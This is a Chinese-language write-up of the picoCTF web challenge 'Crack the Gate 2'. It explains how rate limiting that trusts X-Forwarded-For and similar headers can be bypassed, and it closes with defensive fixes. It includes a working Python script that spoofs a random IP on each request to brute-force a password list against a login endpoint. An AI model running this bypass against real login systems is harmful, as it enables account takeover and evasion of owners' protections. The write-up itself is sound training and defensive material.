## Challenge Metadata

- **Platform:** picoCTF
- **Category:** Web Exploitation
- **Difficulty:** Medium
- **Author:** Bryan
- **Date:** 2026-02-18

## 一、基本資訊

**題目名稱：** Crack the Gate 2  
**題目類型：** Web Exploitation  
**平台：** picoCTF  
**目標：** 繞過登入系統的 rate limiting 機制，利用提供的 password list 成功登入帳號 ctf-player@picoctf.org 並取得 flag

## 二、題目概述

本題提供一個 Web 登入系統，使用者必須輸入 email 與 password 才能登入。題目同時提供一份 password list，暗示可以透過嘗試不同密碼進行登入。

然而系統加入了一個基本的 rate limiting 機制，當同一來源在短時間內多次登入失敗時，系統會暫時封鎖該來源，使其無法繼續嘗試登入。

題目提示系統可能仍然信任使用者可控制的 HTTP header，因此可能存在可以繞過 rate limiting 的方式。

## 三、分析目標

本次分析的主要目標如下：

- 確認登入 API 的運作方式
- 觀察系統的 rate limiting 行為
- 找出可繞過 rate limiting 的弱點
- 撰寫 brute-force script 嘗試 password list
- 成功登入並取得 flag

## 四、初步分析

首先開啟題目提供的網站，登入頁面會要求輸入：

- email
- password

透過瀏覽器開發者工具 (Developer Tools) 觀察 network request，可發現登入是透過以下 API：

`POST /login`

Request payload 為 JSON 格式：

```json
{
  "email": "...",
  "password": "..."
}
```

成功登入時，伺服器會回傳 JSON：

```json
{
  "success": true,
  "flag": "..."
}
```

失敗時則回傳錯誤訊息。

## 五、弱點判定

### 5.1 弱點描述

當多次登入失敗後，伺服器會回傳：

"Too many failed attempts.
Please try again later."

這表示系統存在 IP-based Rate Limiting，也就是：

- 系統會根據 client IP 記錄登入失敗次數
- 當失敗次數過多時，就會暫時封鎖該 IP

然而題目提示系統可能信任 user-controlled headers。

在許多 Web 架構中，伺服器會透過以下 header 取得使用者 IP：

- X-Forwarded-For
- X-Real-IP
- CF-Connecting-IP
- True-Client-IP

如果伺服器直接信任這些 header，而沒有確認其來源是否為可信 proxy，攻擊者就可以自行偽造 IP。

### 5.2 弱點類型

- Rate Limit Bypass
- Header Spoofing
- Improper Trust of Client Headers

### 5.3 風險說明

若攻擊者可以偽造來源 IP，就可以在每一次請求中使用不同 IP，讓伺服器誤以為每次請求都來自不同來源。

如此便可繞過 rate limiting，並進行大量登入嘗試 (brute force)。

## 六、攻擊思路

原本登入流程如下：

Client IP → 多次登入失敗 → Rate Limit → 封鎖

若每次請求都偽造不同 IP：

Request1 → IP1
Request2 → IP2
Request3 → IP3

伺服器就會認為：

每次請求都是不同來源

因此 rate limiting 機制將無法正常發揮作用。

攻擊者即可利用 password list 持續嘗試登入。

## 七、利用過程

### 7.1 建立 brute-force script

撰寫 Python script 自動嘗試 password list。

```python
import requests
import random

BASE = "http://amiable-citadel.picoctf.net:<port>"
URL = f"{BASE}/login/"
EMAIL = "ctf-player@picoctf.org"

def rand_ip():
    return ".".join(str(random.randint(1,254)) for _ in range(4))

with open("passwords.txt") as f:
    passwords = [p.strip() for p in f]

for pw in passwords:
    ip = rand_ip()

    headers = {
        "Content-Type": "application/json",
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "CF-Connecting-IP": ip,
        "True-Client-IP": ip
    }

    payload = {
        "email": EMAIL,
        "password": pw
    }

    r = requests.post(URL, headers=headers, json=payload)

    data = r.json()

    if data.get("success"):
        print("Password:", pw)
        print("Flag:", data["flag"])
        break
```

### 7.2 執行 script

python3 exploit.py

Script 會：

- 從 password list 讀取密碼
- 每次 request 隨機生成 IP
- 將 IP 放入 spoof header
- 嘗試登入

## 八、利用結果

當嘗試到正確密碼時，伺服器回傳：

{
  "success": true,
  "flag": "picoCTF{...}"
}

成功取得 flag。

## 九、完整 exploit 指令

python3 exploit.py

## 十、成因分析

本題弱點產生的原因，在於伺服器錯誤地信任 client 提供的 header。

問題點如下：

- Rate limiting 依賴 client IP
- 伺服器直接使用 header 中的 IP
- 未確認 header 是否由可信 proxy 設定

因此攻擊者可以自行偽造 IP，繞過 rate limiting。

## 十一、防禦建議

為避免此類問題，可採取以下措施：

### 11.1 不要信任 client header

伺服器應只信任由 proxy 或 load balancer 設定的 header。

### 11.2 使用真實來源 IP

應使用：

- request.remote_addr
- 或由可信 proxy 傳遞的 IP。

### 11.3 加入額外防護

例如：

- CAPTCHA
- account lock
- login delay
- IP reputation system

## 十二、結論

本題展示了 Web 系統中常見的安全問題：伺服器錯誤信任 client header，導致 rate limiting 機制可以被輕易繞過。

攻擊者只需偽造來源 IP，即可讓伺服器誤以為每次請求來自不同使用者，進而持續進行 brute force 嘗試並最終成功登入。

這類問題在實際 Web 系統中相當常見，因此在設計 rate limiting 或身份驗證機制時，必須確保 IP 資訊來源是可信的。

## 十三、附錄：關鍵觀念整理

| 項目 | 說明 |
|---|---|
| 弱點名稱 | Rate Limit Bypass |
| 利用條件 | 伺服器信任 client header |
| 利用方式 | 偽造 X-Forwarded-For 等 header |
| 攻擊效果 | 繞過 rate limiting |
| 本題成果 | brute force 成功登入並取得 flag |

## 使用工具

- Python
- requests
- Burp Suite
- Browser Developer Tools
